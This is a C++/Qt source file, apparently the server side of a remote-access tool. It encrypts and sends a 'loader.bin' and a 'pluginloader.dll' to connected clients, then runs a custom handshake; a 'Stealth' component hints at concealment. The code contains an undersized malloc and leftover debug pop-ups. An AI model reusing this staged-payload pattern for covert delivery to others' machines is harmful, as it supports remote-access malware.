#include "connectionmanager.h"

ConnectionManager::ConnectionManager(Stealth* stealth,MessageManager* mngMessage,QObject* parent) : QObject(parent)
{
    this->mngMessage=mngMessage;
    this->stealth=stealth;

    connect(this,SIGNAL(connectionEstablished(Connection*)),this,SLOT(addConnection(Connection*)));
    connect(mngMessage,SIGNAL(receivedHandshake(Connection*)),this,SLOT(processHandshake(Connection*)));
    connect(mngMessage,SIGNAL(receivedLoaderOk(Connection*)),this,SLOT(sendPluginManager(Connection*)));
}

void ConnectionManager::sendLoader(Connection *connection)
{
    if(connection->getState()==Connection::JustConnected)
    {
        connect(connection,SIGNAL(readyRead()),mngMessage,SLOT(readMessage()));

        /* Carga desde archivo */
        QFile fileLoader("loader.bin");
        if(!fileLoader.open(QIODevice::ReadOnly)) return;
        QByteArray Loader=fileLoader.readAll();
        fileLoader.close();

        /* Añadimos padding PKCS7 */
        char pad=16-((Loader.size()+4)%16);
        for(int i=0;i<pad;i++)
        {
            Loader.append(pad);
        }

        QByteArray checkSum=Crypto::FNV1a(Loader);
        Loader.insert(0,checkSum);

        QByteArray crypted=connection->crypt(Loader,false);

        connection->write(connection->getIV()+crypted);

        connection->setState(Connection::WaitingForLoader);
    }
}

void ConnectionManager::sendPluginManager(Connection *connection)
{
    QFile filePluginLoader("pluginloader.dll");
    if(!filePluginLoader.open(QIODevice::ReadOnly)) return;
    QByteArray pluginLoader=filePluginLoader.readAll();
    filePluginLoader.close();

    /* Añadimos padding PKCS7 */
    char pad=16-((pluginLoader.size()+4)%16);
    for(int i=0;i<pad;i++)
    {
        pluginLoader.append(pad);
    }

    QByteArray checkSum=Crypto::FNV1a(pluginLoader);
    pluginLoader.insert(0,checkSum);


    QByteArray crypted=connection->crypt(pluginLoader,false);

    quint32 pluginManagerSize=pluginLoader.size();
    crypted.insert(0,(char*)&pluginManagerSize,4);
    connection->write(crypted);

    connection->setState(Connection::WaitingForGreeting);
}

void ConnectionManager::processHandshake(Connection* connection)
{
    //FIXME: Reestablecer a WaitingForGreeting?
    if(connection->getState()!=Connection::ReadingGreeting) return;
    if(connection->Data.size()!=connection->NextBlockHeader.Size.Bytes) return;

    //Guardamos el HandShake
    connection->HandShake=*(Connection::RPEP_SERVER_HANDSHAKE*)connection->Data.data();

    Connection::RPEP_CLIENT_HANDSHAKE* ClientHandShake;

    //FIXME: Definir número de puertos correcto
#define NUM_PORTS 1

    ClientHandShake=(Connection::RPEP_CLIENT_HANDSHAKE*)malloc(
                sizeof(Connection::RPEP_CLIENT_HANDSHAKE)+sizeof(ushort)*NUM_PORTS
                );

    ClientHandShake->CompressionALGM=connection->HandShake.SupportedCompressionAlgm[0];
    ClientHandShake->MaxBlockSize=connection->HandShake.MaxBlockSize;
    ClientHandShake->Port[0]=2000;
    ClientHandShake->PortCount=NUM_PORTS;
    ClientHandShake->Version.High=1;
    ClientHandShake->Version.Low=0;


    Connection::RPEP_HEADER::_OperationType* Operation=(Connection::RPEP_HEADER::_OperationType*)malloc(sizeof(Connection::RPEP_HEADER::_OperationType*));

    QMessageBox::information(0,":P","Enviando handshake");

    connection->send(Operation,(char*)ClientHandShake,sizeof(Connection::RPEP_CLIENT_HANDSHAKE)+sizeof(ushort)*NUM_PORTS);

    free(ClientHandShake);
    free(Operation);

    QMessageBox::information(0,":P","Handshake enviado");

    connection->setState(Connection::Ready);
    emit connectionReady(connection);


}

void ConnectionManager::addConnection(Connection* connection)
{
    Connections.append(connection);
}
